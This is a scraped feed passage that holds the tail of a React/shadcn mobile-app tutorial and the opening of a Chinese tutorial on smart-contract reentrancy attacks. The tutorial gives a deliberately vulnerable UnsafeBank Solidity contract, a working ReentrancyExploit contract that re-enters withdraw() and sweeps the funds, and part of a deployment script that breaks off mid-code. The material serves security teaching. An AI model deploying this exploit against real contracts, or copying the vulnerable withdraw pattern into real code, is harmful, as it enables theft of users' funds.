      <span class="hljs-title function_">navigate</span>(<span class="hljs-string">'/login'</span>) <span class="hljs-comment">// 强制跳转登录页</span>
    }
  }, [isLogin, navigate, pathname]) <span class="hljs-comment">// 依赖项：任何一个变化都会触发检查</span>

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      {/* 这里的 BackToTop 是全局组件，所有页面都有 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">BackToTop</span>/&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  )
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>
</code></pre>
<p><strong>💡 为什么用 useEffect？</strong>
React 的组件渲染是纯函数，不能直接在渲染过程中执行跳转（Side Effect）。必须放在 <code>useEffect</code> 中，等组件挂载或更新后再执行逻辑。</p>
<hr/>
<h2 data-id="heading-16">🏠 六、 首页开发：shadcn 实战</h2>
<p>终于到了画页面的时候了！我们将使用 shadcn 的 <code>Card</code> 组件来快速搭建首页。</p>
<h3 data-id="heading-17">6.1 通用头部组件 (Header)</h3>
<p>先写一个通用的 <code>Header.tsx</code>。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>; 
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ui/button'</span>; <span class="hljs-comment">// 复用 shadcn 的 Button</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ArrowLeft</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'lucide-react'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HeaderProps</span> {
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;
  showBackBtn?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// 可选属性</span>
  onBackClick?:<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">Header</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">HeaderProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{
  title,
  showBackBtn = <span class="hljs-literal">false</span>, // 默认不显示返回按钮
  onBackClick = () =&gt; <span class="hljs-variable language_">window</span>.history.back() // 默认行为：浏览器后退
}</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex items-center justify-center h-16 px-4 border-b bg-white sticky top-0 z-40"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"absolute left-4"</span>&gt;</span>
      {
        showBackBtn &amp;&amp; (
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"ghost"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onBackClick}</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ArrowLeft</span> <span class="hljs-attr">size</span>=<span class="hljs-string">{20}/</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        )
      }
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-lg font-semibold truncate max-w-[60%] text-center"</span>&gt;</span>
        {title}
      <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span>
  )
}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">Header</span>
</code></pre>
<h3 data-id="heading-18">6.2 首页 (Home.tsx)</h3>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/Header'</span>;
<span class="hljs-comment">// 引入 shadcn 的 Card 组件系列</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Card</span>, <span class="hljs-title class_">CardHeader</span>, <span class="hljs-title class_">CardTitle</span>, <span class="hljs-title class_">CardContent</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ui/card'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"首页"</span> <span class="hljs-attr">showBackBtn</span>=<span class="hljs-string">{true}</span> /&gt;</span>
          
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"p-4 space-y-4"</span>&gt;</span> {/* space-y-4 给所有子元素之间添加垂直间距 */}
            
            {/* 这里的 Card 直接使用了我们项目里的组件代码 */}
            <span class="hljs-tag">&lt;<span class="hljs-name">Card</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">CardHeader</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">CardTitle</span>&gt;</span>欢迎来到 React Mobile<span class="hljs-tag">&lt;/<span class="hljs-name">CardTitle</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">CardHeader</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">CardContent</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-muted-foreground"</span>&gt;</span>这是基于 shadcn/ui 构建的现代化应用<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">CardContent</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">Card</span>&gt;</span>

            {/* Grid 布局展示列表 */}
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"grid grid-cols-2 gap-4"</span>&gt;</span>
            {
              [1,2,3,4,5,6,7,8,9,10,11,12].map((i,index) =&gt; (
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
                  <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span> 
                  <span class="hljs-attr">className</span>=<span class="hljs-string">"h-32 bg-white rounded-lg shadow-sm flex items-center justify-center border hover:shadow-md transition-shadow"</span>
                &gt;</span>
                  Item {i}
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
              ))
            }
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/&gt;</span></span>
    )
}
</code></pre>
<h3 data-id="heading-19">6.3 回到顶部 (BackToTop)</h3>
<p>最后，给用户一个小惊喜。当页面滑动超过一定距离时，显示“回到顶部”按钮。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useEffect, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ui/button'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ArrowUp</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'lucide-react'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">BackToTopProps</span> {
    threshould?: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// 阈值：滚动多少像素显示</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">BackToTop</span>:<span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">BackToTopProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{ threshould = <span class="hljs-number">400</span> }</span>) =&gt;</span>{
  <span class="hljs-keyword">const</span> [isVisible, setIsVisible] = useState&lt;<span class="hljs-built_in">boolean</span>&gt;(<span class="hljs-literal">false</span>);

  useEffect (<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleVisibility</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-comment">// window.scrollY 获取当前垂直滚动距离</span>
        <span class="hljs-title function_">setIsVisible</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> &gt; threshould);
    }
    <span class="hljs-comment">// 添加滚动监听</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, toggleVisibility);
    
    <span class="hljs-comment">// 🧹 清理函数：组件卸载时移除监听，防止内存泄漏！</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, toggleVisibility);
  }, [threshould])

  <span class="hljs-keyword">if</span>(!isVisible) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">scrollToTop</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>({ <span class="hljs-attr">top</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span> }); <span class="hljs-comment">// 平滑滚动</span>
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
      <span class="hljs-attr">variant</span>=<span class="hljs-string">"outline"</span>
      <span class="hljs-attr">size</span>=<span class="hljs-string">"icon"</span>
      <span class="hljs-attr">onClick</span>=<span class="hljs-string">{scrollToTop}</span>
      <span class="hljs-attr">className</span>=<span class="hljs-string">"fixed bottom-20 right-6 rounded-full shadow-lg z-50 bg-white/80 backdrop-blur-sm"</span>
    &gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ArrowUp</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-4 h-4"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span>
  )
}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">BackToTop</span>;
</code></pre>
<hr/>
<h2 data-id="heading-20">📝 总结与预告</h2>
<p>今天，我们干了一件大事！</p>
<ol>
<li><strong>工程化</strong>：配置了 <code>@</code> 路径别名，让项目结构更清晰。</li>
<li><strong>UI 革命</strong>：引入了 <strong>shadcn/ui</strong>，体验了“拥有组件代码”的快感。</li>
<li><strong>架构实战</strong>：搭建了完整的移动端路由架构，实现了 <code>MainLayout</code> + <code>BottomNav</code> 的经典布局。</li>
<li><strong>权限控制</strong>：利用 Zustand + Router Guard 实现了全局登录拦截。</li>
<li><strong>Hooks 运用</strong>：深入使用了 <code>useEffect</code>, <code>useState</code>, <code>useLocation</code> 等 React 核心技能。</li>
</ol>
<p>现在的应用虽然长得挺好看，但数据都是假的（Mock data）。
<strong>下一章预告</strong>：我们将回到后端，完善 NestJS 接口，打通前后端任督二脉，实现真正的<strong>用户登录</strong>和<strong>文章列表获取</strong>！</p>
<p>我们要把“全栈”进行到底！大家加油！🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[黑吃黑：重入攻击秒提ETH＋瞬锁修复]]></title>    <link>https://juejin.cn/post/7596869784538988544</link>    <guid>https://juejin.cn/post/7596869784538988544</guid>    <pubDate>2026-01-19T17:11:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596869784538988544" data-draft-id="7596845113281708041" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="黑吃黑：重入攻击秒提ETH＋瞬锁修复"/> <meta itemprop="keywords" content="智能合约,Solidity,web3"/> <meta itemprop="datePublished" content="2026-01-19T17:11:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="木西"/> <meta itemprop="url" content="https://juejin.cn/user/2436173496845549"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            黑吃黑：重入攻击秒提ETH＋瞬锁修复
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173496845549/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    木西
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:11:10.000Z" title="Mon Jan 19 2026 17:11:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<blockquote>
<p>本文聚焦 DeFi 领域中典型的重入攻击（Reentrancy Attack）安全漏洞，从理论层面剖析重入攻击的原理与危害，再基于 Hardhat V3 开发框架，结合 OpenZeppelin V5 安全库，通过代码实践完整复现重入攻击的全过程；最后针对该漏洞的核心成因，给出基于行业最佳实践的修复方案，并通过代码验证修复效果。全文采用 “理论分析 - 攻击复现 - 漏洞修复” 的逻辑脉络，将重入攻击的技术原理与工程实践相结合，清晰呈现该安全漏洞的风险点及防护手段。</p>
</blockquote>
<h2 data-id="heading-1">重入攻击是什么</h2>
<p><strong>1. 核心定义</strong>：重入攻击（Reentrancy Attack）是智能合约中一种经典的安全漏洞。它的核心原理是：<strong>外部恶意合约利用回调机制，在目标合约的函数执行过程尚未结束（即状态变量尚未更新）时，再次递归调用该函数，从而反复窃取资产或破坏逻辑。</strong></p>
<p><strong>2. 通俗类比</strong></p>
<ul>
<li><strong>场景</strong>：你去银行取钱。</li>
<li><strong>正常流程</strong>：你申请取钱 -&gt; 银行扣除你的余额 -&gt; 银行给你现金。</li>
<li><strong>重入攻击流程</strong>：你申请取钱 -&gt; 银行给你现金（还没来得及扣余额） -&gt; 你拿到现金的瞬间，立刻又申请取钱 -&gt; 银行检查余额（还是满的） -&gt; 银行又给你现金…… 循环往复，直到银行破产。</li>
</ul>
<p><strong>3. 技术原理</strong>：在 Ethereum（以太坊）等 EVM 兼容链上，当合约向外部地址（EOA 或其他合约）发送 ETH（使用<code>call</code>）或执行低级别调用时，接收方合约的<code>fallback()</code>或<code>receive()</code>函数会被触发。如果目标合约在<strong>修改状态变量（如用户余额）之前</strong>就执行了转账操作，攻击者就可以在<code>fallback</code>函数中再次调用目标合约的提款函数，导致 “余额未清零” 的漏洞被反复利用。</p>
<h2 data-id="heading-2">Web3 历史上的重大重入攻击事件</h2>









































<table><thead><tr><th>事件名称</th><th>发生时间</th><th>损失金额</th><th>核心细节</th></tr></thead><tbody><tr><td>The DAO 攻击</td><td>2016 年</td><td>约 6000 万美元（当时约占以太坊总量的 15%）</td><td>利用 DAO 合约中<code>splitDAO</code>函数的重入漏洞，通过递归调用将资金转移到子 DAO 中，导致以太坊社区硬分叉为 ETH 和 ETC。</td></tr><tr><td>Parity 钱包多重签名漏洞攻击</td><td>2017 年</td><td>约 3000 万美元</td><td>主因为库合约自杀致代码不可用，<code>delegatecall</code>重入逻辑复杂性是导火索之一，造成多个钱包合约被冻结或盗取。</td></tr><tr><td>bZx 闪电贷重入攻击</td><td>2020 年</td><td>约 800 万美元</td><td>DeFi Summer 初期典型攻击，结合闪电贷与重入攻击，操纵价格后借重入漏洞在旧价格下清算套利，开启组合拳攻击时代。</td></tr><tr><td>Cream Finance 攻击</td><td>2021 年</td><td>约 1.3 亿美元</td><td>利用 ETH 和 YFI 市场重入漏洞，铸造大量 crETH 代币并赎回，导致协议巨额损失。</td></tr><tr><td>Euler Finance 攻击</td><td>2023 年</td><td>约 1.97 亿美元</td><td>利用 DToken 合约重入漏洞，在清算过程中反复借款并提取抵押品，造成巨额损失。</td></tr></tbody></table>
<h2 data-id="heading-3">重入攻击的危害</h2>
<p><strong>1. 资产直接被盗（经济损失）</strong>：这是最直接的后果。攻击者可以在合约逻辑未能更新余额之前，将合约内的所有流动性资金（ETH、ERC20 代币等）转移至自己的地址，导致协议瞬间资不抵债（Rug Pull）。</p>
<p><strong>2. 合约状态混乱（逻辑破坏）</strong>：即使资金没有被转走，反复的递归调用可能导致合约的状态变量（如借贷利率、清算价格、总供应量）计算错误。一旦状态被破坏，合约可能永久无法正常运行，甚至导致剩余资产无法提取。</p>
<p><strong>3. 协议信任崩塌（声誉破产）</strong>：DeFi 的核心是 “Code is Law”（代码即法律）。一旦发生重入攻击，意味着代码存在致命缺陷，用户会对协议失去信任，导致流动性迅速撤离，项目方代币价格归零，项目直接死亡。</p>
<p><strong>4. 复杂攻击的跳板</strong>：在现代 DeFi 攻击中，重入往往不是单一手段，而是配合闪电贷、价格操纵、预言机攻击的关键一环。它能放大攻击的杠杆效应，让攻击者在一个区块内完成数亿级别的套利。</p>
<h2 data-id="heading-4">智能合约实现</h2>
<h3 data-id="heading-5">漏洞复现</h3>
<h4 data-id="heading-6">智能合约</h4>
<ul>
<li><strong>不安全银行合约</strong></li>
</ul>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-selector-class">.24</span>;

contract UnsafeBank {
    <span class="hljs-built_in">mapping</span>(address =&gt; uint) public balances;

    function <span class="hljs-built_in">deposit</span>() external payable {
        balances<span class="hljs-selector-attr">[msg.sender]</span> += msg<span class="hljs-selector-class">.value</span>;
    }

    function <span class="hljs-built_in">withdraw</span>() external {
        uint amount = balances<span class="hljs-selector-attr">[msg.sender]</span>;
        <span class="hljs-built_in">require</span>(amount &gt; <span class="hljs-number">0</span>, "no fund");

        <span class="hljs-comment">// 先转账，后更新 → 可被重入</span>
        (bool ok,) = msg<span class="hljs-selector-class">.sender</span><span class="hljs-selector-class">.call</span>{value: amount}("");
        <span class="hljs-built_in">require</span>(ok, "send failed");

        balances<span class="hljs-selector-attr">[msg.sender]</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// 太晚！</span>
    }
}
</code></pre>
<ul>
<li><strong>重入攻击合约</strong></li>
</ul>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-selector-class">.24</span>;

import "./UnsafeBank<span class="hljs-selector-class">.sol</span>";

contract ReentrancyExploit {
    UnsafeBank public immutable bank;
    bool private _isAttacking; <span class="hljs-comment">// 标记是否处于攻击状态</span>

    <span class="hljs-built_in">constructor</span>(address _bank) {
        bank = <span class="hljs-built_in">UnsafeBank</span>(_bank);
    }
    
    function <span class="hljs-built_in">attack</span>() external payable {
        <span class="hljs-built_in">require</span>(msg.value &gt; <span class="hljs-number">0</span>, "Need ETH to attack");
        _isAttacking = true; <span class="hljs-comment">// 开启攻击状态</span>
        
        <span class="hljs-comment">// 1. 存入资金</span>
        bank<span class="hljs-selector-class">.deposit</span>{value: msg.value}();
        <span class="hljs-comment">// 2. 触发第一次提款</span>
        bank<span class="hljs-selector-class">.withdraw</span>();
        
        _isAttacking = false; <span class="hljs-comment">// 结束攻击状态</span>
    }

    <span class="hljs-comment">// receive() external payable {</span>
    <span class="hljs-comment">//     // 只有在攻击状态下，且银行还有钱时才重入</span>
    <span class="hljs-comment">//     if (_isAttacking &amp;&amp; address(bank).balance &gt;= msg.value) {</span>
    <span class="hljs-comment">//         bank.withdraw();</span>
    <span class="hljs-comment">//     }</span>
    <span class="hljs-comment">// }</span>
    <span class="hljs-built_in">receive</span>() external payable {
        <span class="hljs-comment">// 关键：增加余额检查，防止无限递归</span>
        <span class="hljs-comment">// 只有当银行里还有钱时，才继续提款</span>
        if (address(bank)<span class="hljs-selector-class">.balance</span> &gt;= <span class="hljs-number">1</span> ether) { 
            bank<span class="hljs-selector-class">.withdraw</span>();
        }
    }
    function <span class="hljs-built_in">loot</span>() external {
        <span class="hljs-built_in">payable</span>(msg.sender)<span class="hljs-selector-class">.transfer</span>(address(this)<span class="hljs-selector-class">.balance</span>);
    }
}

</code></pre>
<h4 data-id="heading-7">部署脚本</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// scripts/deploy.js</span>
<span class="hljs-keyword">import</span> { network, artifacts } <span class="hljs-keyword">from</span> <span class="hljs-string">"hardhat"</span>;
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 连接网络</span>
  <span class="hljs-keyword">const</span> { viem } = <span class="hljs-keyword">await</span> network.<span class="hljs-title function_">connect</span>({ <span class="hljs-attr">network</span>: network.<span class="hljs-property">name</span> });<span class="hljs-comment">//指定网络进行链接</span>
  
  <span class="hljs-comment">// 获取客户端</span>
  <span class="hljs-keyword">const</span> [deployer] = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getWalletClients</span>();
  <span class="hljs-keyword">const</span> publicClient = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getPublicClient</span>();
 
  <span class="hljs-keyword">const</span> deployerAddress = deployer.<span class="hljs-property">account</span>.<span class="hljs-property">address</span>;
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"部署者的地址:"</span>, deployerAddress);
  <span class="hljs-comment">// 加载合约</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">UnsafeBankArtifact</span> = <span class="hljs-keyword">await</span> artifacts.<span class="hljs-title function_">readArtifact</span>(<span class="hljs-string">"UnsafeBank"</span>);
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">ReentrancyExploitArtifact</span> = <span class="hljs-keyword">await</span> artifacts.<span class="hljs-title function_">readArtifact</span>(<span class="hljs-string">"ReentrancyExploit"</span>);
 
  <span class="hljs-comment">// 部署（构造函数参数：recipient, initialOwner）</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">UnsafeBankHash</span> = <span class="hljs-keyword">await</span> deployer.<span class="hljs-title function_">deployContract</span>({
    <span class="hljs-attr">abi</span>: <span class="hljs-title class_">UnsafeBankArtifact</span>.<span class="hljs-property">abi</span>,<span class="hljs-comment">//获取abi</span>
    <span class="hljs-attr">bytecode</span>: <span class="hljs-title class_">UnsafeBankArtifact</span>.<span class="hljs-property">bytecode</span>,<span class="hljs-comment">//硬编码</span>
    <span class="hljs-attr">args</span>: [],<span class="hljs-comment">//</span>
  });
   <span class="hljs-keyword">const</span> <span class="hljs-title class_">UnsafeBankReceipt</span> = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">waitForTransactionReceipt</span>({ <span class="hljs-attr">hash</span>: <span class="hljs-title class_">UnsafeBankHash</span> });
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"银行合约地址:"</span>, <span class="hljs-title class_">UnsafeBankReceipt</span>.<span class="hljs-property">contractAddress</span>);
<span class="hljs-comment">//</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ReentrancyExploitHash</span> = <span class="hljs-keyword">await</span> deployer.<span class="hljs-title function_">deployContract</span>({
    <span class="hljs-attr">abi</span>: <span class="hljs-title class_">ReentrancyExploitArtifact</span>.<span class="hljs-property">abi</span>,<span class="hljs-comment">//获取abi</span>
